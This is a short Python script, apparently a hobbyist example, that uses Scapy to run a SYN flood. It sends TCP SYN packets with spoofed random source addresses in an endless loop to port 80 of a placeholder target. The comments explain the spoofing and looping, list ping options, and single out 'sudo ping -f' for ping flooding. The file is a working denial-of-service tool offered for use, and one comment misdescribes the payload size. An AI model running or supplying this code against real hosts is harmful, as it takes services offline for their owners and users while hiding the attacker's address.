from scapy.all import *

target_ip="e.f.g.h"
target_port=80

ip=IP(src=RandIP(), dst=target_ip) #for spoofing sender's IP
tcp=TCP(sport=RandShort(), dport=target_port, flags="S")  #flag="S" for SYN; RandShort() selects random value from 1 to 65535

raw=Raw(load="abc") #raw file of size 1KB to be flooded

p=ip/tcp/raw #creating packet p

send(p, loop=1, verbose=0) #loop=1 defines while(loop==1) until Ctrl+C;  verbose=0 will help in not print anything during the process

# to obtain result at target router use command: ping -t "a.b.c.d";
# ex: ping -t google.com, ping localhost
# ping -6 hostname/IPv6 , ping -4 hostname/IPv4
# ping -i 0.5 hostname  ;to set interval between each ping request; default is 1sec
# ping –c 2 hostname   ;to limit packets ,here 2 packets
# ping -w 25 hostname   ;to set time limit of 25seconds 
#
#sudo ping -f hostname-IP  ;to ping flood an IP  (IMPORTANT)
